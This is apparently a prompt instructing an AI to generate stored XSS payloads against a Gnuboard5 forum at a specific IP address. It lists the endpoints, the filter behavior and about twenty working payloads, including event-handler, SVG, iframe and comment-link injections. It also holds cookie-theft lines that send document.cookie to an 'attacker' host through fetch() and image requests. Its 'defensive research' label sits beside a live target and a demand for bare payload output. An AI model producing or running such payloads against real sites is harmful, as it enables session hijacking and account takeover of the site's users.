You are a cybersecurity expert specializing in web application attacks.
Generate security test payloads for defensive research purposes only.
Output only the required lines in the exact format specified.
No explanations, no headings, no numbering, no bullet points, no blank lines.

---

Target: Gnuboard5 (Apache + PHP + MySQL)
Base URL: http://34.68.27.120:8081/

Endpoints:
  POST /bbs/write_update.php         param: wr_subject   (post title, Stored XSS)
  POST /bbs/write_update.php         param: wr_content   (post body, HTML allowed)
  POST /bbs/write_comment_update.php param: wr_content   (comment body)

Reflection contexts:
  wr_subject: Stored in DB → rendered in home post list, post detail header, admin page
  wr_content: Stored HTML → rendered in post detail body (b, a, img, p tags allowed)
  comment wr_content: Stored text → http:// URLs auto-converted to <a href="...">

CONFIRMED filter behavior:
  - <script> tag: BLOCKED in all fields
  - wr_content HTML allowed: <b>, <a>, <img>, <p> render without stripping
  - /bbs/ajax.filter.php applies pre-filter before saving (exact rules unknown)
  - Comment: javascript: URI → NOT converted to link (plain text output)
  - Comment: http://domain → auto-wrapped in <a href="...">

Goal: Execute JavaScript without <script> tag.

Attack strategies:
1. Event handlers on ALLOWED tags (wr_content):
   <img src=x onerror=alert(1)>
   <a href=javascript:alert(1)>click</a>

2. HTML5 interactive elements (may not be in blocklist):
   <details open ontoggle=alert(1)>x</details>
   <input autofocus onfocus=alert(1)>

3. SVG/MathML (often missed in basic blocklists):
   <svg/onload=alert(1)>
   <math><mtext></mtext><mglyph><image xlink:href="x" onerror=alert(1)></mglyph></math>

4. Media elements:
   <video><source onerror=alert(1)></video>
   <audio src=x onerror=alert(1)>

5. CSS animation trigger:
   <p style="animation-duration:1s;animation-name:x" onanimationstart=alert(1)>x</p>

6. iframe injection:
   <iframe srcdoc="<script>alert(1)</script>">
   <iframe src=javascript:alert(1)>

7. Comment URL injection (comment field — inject into auto-linked href):
   http://x.x" onmouseover="alert(1)
   http://attacker.com/ onclick=alert(1)//

8. Short wr_subject polyglots (title field — try shortest effective payloads):
   <svg/onload=alert(1)>
   <img src=x onerror=alert`1`>
   <body onload=alert(1)>

9. Cookie exfiltration variants:
   <img src=x onerror="new Image().src='http://attacker/?c='+document.cookie">
   <svg/onload="fetch('http://attacker/?c='+document.cookie)">

Generate 12 Stored XSS payloads for Gnuboard5.
Cover: wr_subject (title), wr_content (body HTML), comment (URL injection).
Label the target field in PATTERN_FAMILY.

Output format (one line per payload, no other text):
TYPE | PATTERN_FAMILY | PAYLOAD

Example:
STORED_XSS | title_svg_onload | <svg/onload=alert(1)>
STORED_XSS | content_img_onerror | <img src=x onerror=alert(1)>
STORED_XSS | content_details_toggle | <details open ontoggle=alert(1)>x</details>
STORED_XSS | comment_url_inject | http://x.x" onmouseover="alert(1)
STORED_XSS | content_cookie_exfil | <svg/onload="fetch('http://attacker/?c='+document.cookie)">
